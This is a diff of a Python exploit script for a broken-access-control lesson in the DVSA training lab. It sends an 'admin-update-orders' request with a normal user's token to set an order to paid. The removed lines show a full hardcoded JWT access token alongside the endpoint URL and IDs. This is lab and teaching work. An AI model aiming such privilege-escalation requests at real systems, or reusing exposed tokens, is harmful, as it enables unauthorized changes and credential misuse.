@@ -8,21 +8,23 @@ Lesson 5 - Broken Access Control
 This script tests whether a normal authenticated user can trigger an
 administrative order update operation and change an order status without
 administrator privileges.
+
+IMPORTANT:
+- Use this only in the authorized DVSA lab environment.
+- Do not commit real authorization tokens to GitHub.
+- Paste a fresh normal-user token into AUTH_TOKEN before running.
 """
 
 # ==========================================================
 # 1) Configuration
 # ==========================================================
 
-# API Gateway endpoint for the DVSA order service
 API_URL = "https://d0xsecb8a2.execute-api.us-east-1.amazonaws.com/dvsa/order"
+AUTH_TOKEN = "PASTE_NORMAL_USER_TOKEN_HERE"
 
-# Paste User C authorization token here from browser DevTools
-# IMPORTANT: use a normal user token, not an admin token
-AUTH_TOKEN = "eyJraWQiOiIyRzFjaHhkWnRvdDV6SzR6cTVmUVwvVlNwWHVEVTEzcERLTjNMakUyK3p2VT0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJlNDQ4YzQ4OC1kMDgxLTcwNjItZDM2ZS02NTI1NzYzZDJkMjciLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9xZWtKUjhNbGgiLCJjbGllbnRfaWQiOiI2ZTVnZTBuYnE5NTNkcmJ0b3RrdHRjNWduYiIsIm9yaWdpbl9qdGkiOiJlYzc2Njc3MS02NTMxLTRkMzMtODBjOC1lMTdkNTdjYmNhNzEiLCJldmVudF9pZCI6ImNjYjRkZDljLTk4MmQtNDNiOS05MWVmLTI1NDU0M2ViN2VlZCIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3NzcxMjE4MTYsImV4cCI6MTc3NzEyNTQxNiwiaWF0IjoxNzc3MTIxODE2LCJqdGkiOiJjOGQ2NGJiMy0wNGYyLTQ1MjAtYjJhNC1jMjQyNWEyNWEyNDYiLCJ1c2VybmFtZSI6ImU0NDhjNDg4LWQwODEtNzA2Mi1kMzZlLTY1MjU3NjNkMmQyNyJ9.bmkBShQUNnI3d9jEpzN5m12zfgb7w89c0C7hQlPwLGbJtRXvflkN6rtqqlcJvGgGL4fA2-8L5n5PvAY9eihkTlCz6s1OckYxJJNt106RA5QqHoOe3dDSR_SlFFt6sma5oXABDH34Lr-OUsA4GXOMtuAC-PVZ6EhhjxoxykiQlEkPNXB6KMaBRlTDWG3CKchuAZ2CIMhlLDcygI6GxMYB1oRL8DC9amLEyAoKJM_B6OtPpETho9528vhg51-vvEo2ySEnLM6jDgp3fGOPShDg_XOeGF1mHNuOBDIWP9fn5F-ib8eiS4Zq26uX4QCmg6awLL2gnXTXgHjM20m3CMTTHw"
-
-# Order ID used for Lesson 5 test
 ORDER_ID = "de2c6970-56fc-4b61-8cc5-ef2faf5f4060"
+USER_ID = "e448c488-d081-7062-d36e-6525763d2d27"
+ORDER_TOKEN = "sFxwh10ZuJz7"
 
 
 # ==========================================================
@@ -40,7 +42,8 @@ headers = {
 # ==========================================================
 
 check_payload = {
-    "action": "orders"
+    "action": "orders",
+    "user": USER_ID
 }
 
 print("=" * 70)
@@ -75,8 +78,13 @@ except requests.exceptions.RequestException as error:
 
 exploit_payload = {
     "action": "admin-update-orders",
-    "orderId": ORDER_ID,
-    "status": "paid"
+    "order-id": ORDER_ID,
+    "userId": USER_ID,
+    "status": "paid",
+    "itemList": [],
+    "address": {},
+    "token": ORDER_TOKEN,
+    "total": 44
 }
 
 print("\n" + "=" * 70)
